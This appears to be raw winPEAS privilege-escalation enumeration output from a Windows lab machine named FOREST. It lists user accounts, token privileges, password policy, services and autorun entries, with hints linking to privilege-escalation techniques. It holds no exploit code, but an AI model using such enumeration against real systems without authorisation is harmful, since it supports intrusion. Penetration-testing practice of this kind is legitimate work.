ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
È Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
    SeMachineAccountPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text

ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   Computer Name           :   FOREST
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   9/4/2021 8:26:56 AM
   Logons Count            :   98
   Password Last Set       :   8/30/2021 5:51:58 PM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   krbtgt
   User Id                 :   502
   Is Enabled              :   False
   User Type               :   User
   Comment                 :   Key Distribution Center Service Account
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/18/2019 3:53:23 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   User
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   $331000-VK4ADACQNUCA
   User Id                 :   1123
   Is Enabled              :   False
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   SM_2c8eef0a09b545acb
   User Id                 :   1124
   Is Enabled              :   False
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   SM_ca8c2ed5bdab4dc9b
   User Id                 :   1125
   Is Enabled              :   False
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   SM_75a538d3025e4db9a
   User Id                 :   1126
   Is Enabled              :   False
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   SM_681f53d4942840e18
   User Id                 :   1127
   Is Enabled              :   False
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   SM_1b41c9286325456bb
   User Id                 :   1128
   Is Enabled              :   False
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   SM_9b69f1b9d2cc45549
   User Id                 :   1129
   Is Enabled              :   False
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   SM_7c96b981967141ebb
   User Id                 :   1130
   Is Enabled              :   False
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   SM_c75ee099d0a64c91b
   User Id                 :   1131
   Is Enabled              :   False
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   SM_1ffab36a2f5f479cb
   User Id                 :   1132
   Is Enabled              :   False
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   HealthMailboxc3d7722
   User Id                 :   1134
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   9/23/2019 3:57:12 PM
   Logons Count            :   1470
   Password Last Set       :   9/23/2019 3:51:31 PM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   HealthMailboxfc9daad
   User Id                 :   1135
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   9/23/2019 3:52:05 PM
   Logons Count            :   59
   Password Last Set       :   9/23/2019 3:51:35 PM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   HealthMailboxc0a90c9
   User Id                 :   1136
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/19/2019 4:56:35 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   HealthMailbox670628e
   User Id                 :   1137
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/19/2019 4:56:45 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   HealthMailbox968e74d
   User Id                 :   1138
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/19/2019 4:56:56 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   HealthMailbox6ded678
   User Id                 :   1139
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/19/2019 4:57:06 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   HealthMailbox83d6781
   User Id                 :   1140
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/19/2019 4:57:17 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   HealthMailboxfd87238
   User Id                 :   1141
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/19/2019 4:57:27 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   HealthMailboxb01ac64
   User Id                 :   1142
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/19/2019 4:57:37 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   HealthMailbox7108a4e
   User Id                 :   1143
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/19/2019 4:57:48 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   HealthMailbox0659cc1
   User Id                 :   1144
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/19/2019 4:57:58 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   sebastien
   User Id                 :   1145
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   9/22/2019 3:29:29 PM
   Logons Count            :   8
   Password Last Set       :   9/19/2019 5:29:59 PM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   lucinda
   User Id                 :   1146
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/19/2019 5:44:13 PM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   svc-alfresco
   User Id                 :   1147
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   9/4/2021 11:05:12 AM
   Logons Count            :   13
   Password Last Set       :   9/5/2021 2:39:52 AM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   andy
   User Id                 :   1150
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/22/2019 3:44:16 PM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   mark
   User Id                 :   1151
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/20/2019 3:57:30 PM

   =================================================================================================

   Computer Name           :   FOREST
   User Name               :   santi
   User Id                 :   1152
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   9/20/2019 4:02:55 PM

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
  [X] Exception: Access denied 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public
    C:\Users\sebastien
    C:\Users\svc-alfresco : svc-alfresco [AllAccess]

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  HTB

ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
È Check for a possible brute-force 
  [X] Exception: System.OverflowException: Negating the minimum value of a twos complement number is invalid.
   at System.TimeSpan.op_UnaryNegation(TimeSpan t)
   at winPEAS.Info.UserInfo.UserInfoHelper.GetPasswordPolicy()
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Processes Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Processes -non Microsoft-
È Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes
  [X] Exception: Access denied 


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
  [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
  [X] Exception: Access denied 
  [X] Exception: System.Runtime.InteropServices.COMException (0x80070006): The handle is invalid. (Exception from HRESULT: 0x80070006 (E_HANDLE))
   at System.Runtime.InteropServices.Marshal.ThrowExceptionForHRInternal(Int32 errorCode, IntPtr errorInfo)
   at System.Runtime.InteropServices.Marshal.FreeHGlobal(IntPtr hglobal)
   at winPEAS.Native.Classes.UNICODE_STRING.Dispose(Boolean disposing)
    @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(PMC-Sierra, Inc. - @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[System32\drivers\arcsas.sys] - Boot
   =================================================================================================

    @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD(QLogic Corporation - @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD)[System32\drivers\bxvbda.sys] - Boot
   =================================================================================================

    @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver(QLogic Corporation - @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver)[System32\drivers\bxfcoe.sys] - Boot
   =================================================================================================

    @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver(QLogic Corporation - @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver)[System32\drivers\bxois.sys] - Boot
   =================================================================================================

    @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver(Chelsio Communications - @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver)[C:\Windows\System32\drivers\cht4vx64.sys] - System
   =================================================================================================

    @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I(Intel Corporation - @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I)[C:\Windows\System32\drivers\e1i63x64.sys] - System
   =================================================================================================

    @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD(QLogic Corporation - @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD)[System32\drivers\evbda.sys] - Boot
   =================================================================================================

    @iastorav.inf,%iaStorAV.DeviceDesc%;Intel(R) SATA RAID Controller Windows(Intel Corporation - @iastorav.inf,%iaStorAV.DeviceDesc%;Intel(R) SATA RAID Controller Windows)[System32\drivers\iaStorAV.sys] - Boot
   =================================================================================================

    @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7(Intel Corporation - @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7)[System32\drivers\iaStorV.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver)(Mellanox - @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver))[C:\Windows\System32\drivers\ibbus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator(Mellanox - @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator)[C:\Windows\System32\drivers\mlx4_bus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service(Mellanox - @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service)[C:\Windows\System32\drivers\ndfltr.sys] - System
   =================================================================================================

    @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64))[System32\drivers\ql2300i.sys] - Boot
   =================================================================================================

    @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver(QLogic Corporation - @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver)[System32\drivers\ql40xx2i.sys] - Boot
   =================================================================================================

    @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64))[System32\drivers\qlfcoei.sys] - Boot
   =================================================================================================

    @netgrea.inf,%Svc-Mp-Gre-DispName%;WAN Miniport (GRE)(@netgrea.inf,%Svc-Mp-Gre-DispName%;WAN Miniport (GRE))[C:\Windows\System32\drivers\rasgre.sys] - System
    @netgrea.inf,%Svc-Mp-Gre-DispName%;WAN Miniport (GRE)
   =================================================================================================

    @usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver(@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver)[C:\Windows\System32\drivers\USBSTOR.SYS] - System
   =================================================================================================

    @usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller(@usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller)[C:\Windows\System32\drivers\USBXHCI.SYS] - System
   =================================================================================================

    VMware Alias Manager and Ticket Service(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Autoload
    Alias Manager and Ticket Service
   =================================================================================================

    @oem0.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver(VMware, Inc. - @oem0.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver)[System32\drivers\vmci.sys] - Boot
   =================================================================================================

    Memory Control Driver(VMware, Inc. - Memory Control Driver)[C:\Windows\system32\DRIVERS\vmmemctl.sys] - Autoload
    Driver to provide enhanced memory management of this virtual machine.
   =================================================================================================

    @oem5.inf,%VMMouse.SvcDesc%;VMware Pointing Device(VMware, Inc. - @oem5.inf,%VMMouse.SvcDesc%;VMware Pointing Device)[C:\Windows\System32\drivers\vmmouse.sys] - System
   =================================================================================================

    VMware Tools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Autoload
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================

    @oem4.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device(VMware, Inc. - @oem4.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device)[C:\Windows\System32\drivers\vmusbmouse.sys] - System
   =================================================================================================

    VMware CAF AMQP Communication Service(VMware CAF AMQP Communication Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe"] - System
    VMware Common Agent AMQP Communication Service
   =================================================================================================

    VMware CAF Management Agent Service(VMware CAF Management Agent Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"] - System
    VMware Common Agent Management Agent Service
   =================================================================================================

    vSockets Virtual Machine Communication Interface Sockets driver(VMware, Inc. - vSockets Virtual Machine Communication Interface Sockets driver)[system32\DRIVERS\vsock.sys] - Boot
    vSockets Driver
   =================================================================================================

    @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver(VIA Corporation - @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver)[System32\drivers\vstxraid.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service(Mellanox - @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service)[C:\Windows\System32\drivers\winmad.sys] - System
   =================================================================================================

    @winusb.inf,%WINUSB_SvcDesc%;WinUsb Driver(@winusb.inf,%WINUSB_SvcDesc%;WinUsb Driver)[C:\Windows\System32\drivers\WinUSB.SYS] - System
   =================================================================================================

    @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service(Mellanox - @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service)[C:\Windows\System32\drivers\winverbs.sys] - System
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Modifiable Services
È Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    You cannot modify any service

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry
È Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
    [-] Looks like you cannot change the registry of any service...

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking write permissions in PATH folders (DLL Hijacking)
È Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Applications Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry--
È Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\internet explorer
    C:\Program Files\Uninstall Information
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


ÉÍÍÍÍÍÍÍÍÍÍ¹ Autorun Applications
È Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
Error getting autoruns from WMIC: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at winPEAS.Info.ApplicationInfo.AutoRuns.GetAutoRunsWMIC()

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64
    Folder: None (PATH Injection)
    File: Wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64cpu
    Folder: None (PATH Injection)
    File: Wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64win
    Folder: None (PATH Injection)
    File: Wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: LPK
    Folder: None (PATH Injection)
    File: LPK.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
   =================================================================================================


    Folder: C:\windows\tasks
